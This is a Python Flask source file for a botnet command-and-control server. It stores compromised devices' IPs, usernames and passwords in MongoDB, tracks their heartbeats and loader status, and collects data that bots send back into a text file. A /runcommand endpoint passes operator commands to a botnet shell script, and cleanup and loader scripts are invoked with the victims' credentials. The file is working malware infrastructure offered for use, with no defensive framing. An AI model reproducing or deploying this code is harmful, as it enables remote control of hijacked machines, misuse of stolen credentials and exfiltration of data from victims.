import random, os, json, datetime, time ,string, hashlib, re, csv
from flask import *
from pymongo import *
from flask_cors import CORS
from collections import Counter
import subprocess
import threading
from datetime import datetime
import logging

logging.basicConfig(filename='./logs/server.log',level=logging.DEBUG)

app = Flask(__name__)

CORS(app)

def execute(cmd):
    popen = subprocess.Popen(cmd, stdout=subprocess.PIPE, universal_newlines=True)
    for stdout_line in iter(popen.stdout.readline, ""):
        yield stdout_line 
    popen.stdout.close()
    return_code = popen.wait()
    if return_code:
        raise subprocess.CalledProcessError(return_code, cmd)


def timechecker():
    print("running")
    threading.Timer(10, timechecker).start()



@app.errorhandler(404)
def page_not_found(e):
    return "bla",404

@app.route('/')
def index():
    bots = getBots().get_json()
    heads = ["botId","ip","username","password","sourceIP","active","loaded","directoryName"]
    return render_template('index.html',bots=list(bots.values()),heads=heads)

@app.route('/runcommand',methods=['POST'])
def runcommand():
    command = request.form["command"]
    print("here")
    for line in execute(['sh', 'botnet/command.sh', command]):
        print("command.sh\t"+line.strip())
    print("done")
    return jsonify({'code' : 200})

@app.route('/login')
def loginPage():
    return('login')

botCounter=0

# client = MongoClient('mongo',27017)
client = MongoClient(port=27017)
bots_table  = client.botnet.bots
counter = client.botnet.orgid_counter


### =========================================================================================================
### id increment
### =========================================================================================================



def getNextSequence(collection,name):
    collection.update_one( { '_id': name },{ '$inc': {'seq': 1}})
    return int(collection.find_one({'_id':name})["seq"])




### =========================================================================================================
### API's
### =========================================================================================================

## Get data from bots 

"""
input
{
    "ip": 
    "data": 
}

output into a file data.txt

"""
@app.route('/receiveData', methods=['POST'])
def data():
    f = open("data.txt", "a")
    j = request.get_json()
    botip = j['ip']
    data = j['data']
    f.write("ip = "+ botip + ":" + "data = "+ data)
    f.close()   
    return jsonify({'code' : 200})


### =========================================================================================================
###  remove bot API
### =========================================================================================================
@app.route('/removeBot/<ip>', methods=['GET'])
def removeBot(ip):
    val = bots_table.find_one({"ip":ip})
    if(val is not None):
        bots_table.delete_one({"ip":ip})
        for line in execute(['sh', 'loader/cleanup.sh',val["username"],val["password"],ip]):
            print("cleanup.sh\t"+line.strip())
        return jsonify({'code':200})
    else:
        return jsonify({'code':200,"data":"ip not found"})

### =========================================================================================================
###  remove all Bots
### =========================================================================================================
@app.route('/resetDB', methods=['GET'])
def resetDB():
    # bots_table.remove({})
    val=bots_table.find()
    for x in val:
        removeBot(x.pop("ip"))
    return jsonify({'code':200})


### =========================================================================================================
###  Add BOT API
### =========================================================================================================


@app.route('/addbot', methods=['POST'])
def addbot():
    print(request.remote_addr)
    j = request.get_json()
    val = bots_table.find_one({"ip":j['ip']})
    if(val is not None):
        if(val["username"] == j['username'] and val["password"] == j['password']):
            return jsonify({'code':200,'data':"bot already exists"})
        bots_table.delete_one({"ip":j['ip']})
    nextId = getNextSequence(counter,"botId")  
    result=bots_table.insert_one({'botId':nextId,"ip":j['ip'],"username":j['username'],"password":j['password'],"loaded":0,"directoryName":"","sourceIP":request.remote_addr,"active":1})
    return jsonify({'code':200})


### =========================================================================================================
###  set loaded flag BOT API
### =========================================================================================================

@app.route('/setloaded/<ip>', methods=['GET'])
def setloaded(ip):
    val = bots_table.find_one({"ip":ip})
    if(val is None):
        return jsonify({'code':200,"data":"device not available"})
    bots_table.update_one( { 'ip': ip },{ '$inc': {'loaded': 1}})
    return jsonify({'code':200})

### =========================================================================================================
###  unset loaded flag BOT API
### =========================================================================================================

@app.route('/unsetloaded/<ip>', methods=['GET'])
def unsetloaded(ip):
    val = bots_table.find_one({"ip":ip})
    if(val is None):
        return jsonify({'code':200,"data":"device not available"})
    bots_table.update_one( { 'ip': ip },{ '$inc': {'loaded': -1}})
    return jsonify({'code':200})

### =========================================================================================================
###  Get BOT APIs                                                                                       done
### =========================================================================================================

@app.route('/getBots', methods=['GET'])
def getBots():
    val=bots_table.find()
    d = dict()
    botCounter = 1
    for x in val:
        x.pop("_id")
        d[botCounter] = x
        botCounter+=1
    return jsonify(d)


### =========================================================================================================
###  Get number of BOTs API                                                                             done
### =========================================================================================================
@app.route('/getbotNumber', methods=['GET'])
def number():
    val=bots_table.find()
    botCounter = 0
    for x in val:
        x.pop("_id")
        botCounter+=1
    return jsonify({"number":botCounter})


### =========================================================================================================
###  Get bots with unset loader flag of BOTs API                                                                             done
### =========================================================================================================
@app.route('/getbotunset', methods=['GET'])
def getbotunset():
    val=bots_table.find()
    d = dict()
    botCounter = 1
    for x in val:
        x.pop("_id")
        if(x["loaded"] == 0):
            d[botCounter] = x
            botCounter+=1
    return jsonify(d)


### =========================================================================================================
###  adding directoryName to the BOTs API                                                                             done
### =========================================================================================================
@app.route('/storeDirectory/<ip>', methods=['POST'])
def storeDirectory(ip):
    j = request.get_json()
    val = bots_table.find_one({"ip":ip})
    if(val is None):
        return jsonify({'code':200,"data":"device not available"})
    bots_table.update_one({ 'ip': ip },{"$set":{"directoryName":j["directoryName"]}})
    return jsonify({'code':200})

### =========================================================================================================
### Heartbeat API which changes the bit of the bot to 1.
### =========================================================================================================


@app.route('/heartbeatbot', methods=['GET'])
def heartbeat():
    ip = str(request.remote_addr)
    val = bots_table.find_one({"ip":ip})
    if(val is None):
        return jsonify({"data" : "device not available"})

    bots_table.update_one({'ip' : ip},{"$set" :{"active" : 1}})
    return jsonify({}),200

### =========================================================================================================
### Decrement all by 1
### =========================================================================================================


@app.route('/heartbeatdec',methods=['GET'])
def heart():
    bots_table.update_many({"active" : 0},{"$set" : {"active" : -1,"loaded" : 0,"directoryName":""}})
    bots_table.update_many({"active" : 1},{"$set" : {"active" : 0}})

    return jsonify({}),200




if __name__ == "__main__":
    port = int(os.environ.get('PORT', 5000))
    #threading.Timer(10, timechecker).start()
    app.run(debug=True, host='0.0.0.0', port=port)
